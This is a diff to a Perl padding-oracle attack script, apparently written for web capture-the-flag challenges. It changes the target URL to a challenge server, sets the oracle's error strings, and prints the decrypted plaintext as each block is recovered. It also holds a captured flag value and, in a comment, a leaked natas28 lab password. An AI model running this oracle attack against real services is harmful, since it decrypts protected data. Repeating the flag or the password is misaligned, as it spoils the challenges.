@@ -1,4 +1,4 @@
-#!/usr/bin/perl
+#!/usr/bin/env perl
 use strict;
 use warnings;
 use HTTP::Tiny;# https://perldoc.perl.org/HTTP/Tiny.html
@@ -19,22 +19,22 @@ my @text = ();
 
 #my @wante = ('Padding', 'Incorrect amount of PKCS#7');
 
-my @wante = ('bad');
+my @wante = ('^FLAG^1d6c98018131f055d327e9e6eeb7ac26e69cdeb3b3cc90b1bd3f36a1fb15c135$FLAG$', 'padding', 'Incorrect');
 
-my $parm = 'IKwfTKjlaMCMq0daFlELtRPCxt5ldMJWTSmDCO5ZnP8La0MKyjtBxEuAFVAJB0Y26mdhRIgv7rcQWFLMloNSD4blyRIVlXF07hDNDbfOFdY%3D';
-#my $parm = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPI%2BjVOKpzBAHVGo0XIzCijxvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D';
-#my $parm = 'ULp-Dd93!!pZmzC6q7CnFh9AOMB6NdDJpT5FtFwdPAU4ctEYKuzA14gvyHodr60GOgXDSDIm2PFrp5jLvlQS5ofQGpTrPoQDGq4yl25-QEgSOsYTzV9XidDTHtXncxYmz25bKUDqCz3KZSI0xdbMcyRI7lxDWwtR5MLu!RHzANbyyZwnY037m66XCA-XjMzJbheQcjc5O5yLfLW9iwFDNA~~';
+#my $parm = 'IKwfTKjlaMCMq0daFlELtRPCxt5ldMJWTSmDCO5ZnP8La0MKyjtBxEuAFVAJB0Y26mdhRIgv7rcQWFLMloNSD4blyRIVlXF07hDNDbfOFdY%3D';
+#my $parm = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIi9jK6%2FhBGgtXoRbG6b%2BPmSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc%3D';
+my $parm = 'mSs15EVMapI0hqS91gf6RSlfyg1NLECjzts1b2yQ9lrSg5noe0vywjaYlKjSdC7rwtLe!j9SczoAcTGWRAwflcdu1CHfjG9GPnqzY1u3CyVPP8tU!VjGQxTLGTihjrutUE7lp7Q6WYBZXSryI7Kab6bHWiXQMZe04z6SdjhI87H43fLp5ZG5NwGXdwPTLzR12zoGYxBgOMHrResSFX-vbw~~';
 
-#$parm =~ s/-/+/ig;
-#$parm =~ s/!/\//ig;
-#$parm =~ s/~/=/ig;
+$parm =~ s/-/+/ig;
+$parm =~ s/!/\//ig;
+$parm =~ s/~/=/ig;
 
-my $url = 'http://127.0.0.1:5000/?cte=';
+#my $url = 'http://127.0.0.1:5000/?cte=';
 # Figure out how to redact stuff like this for future reference
 #my $url = 'http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php/?query='; # Whoops I didn't mean to post this, but I guess since Its already on the interwebs not much point in removing instantly.
 #
 
-#my $url = 'http://35.227.24.107/e4fe34027d/?post=';
+my $url = 'http://34.74.105.127/b06a7c2a37/?post=';
 
 $parm = uri_unescape($parm);
 
@@ -130,11 +130,16 @@ while ($bt < $bNum){
     $parm = substr($parm,  0, $qLen+1); # Add 1 because it starts from 1 instead of 0.
     $bt++;
     $AIM = 0;
+    my @plainText = reverse(@text);
+    foreach( @plainText ){
+        print chr($_);
+    } 
+print "\n\n";
 }
 print "\n";
 
-my @plainText = reverse(@text);
 print "done\n";
+my @plainText = reverse(@text);
 foreach( @plainText ){
     print chr($_);
 } 
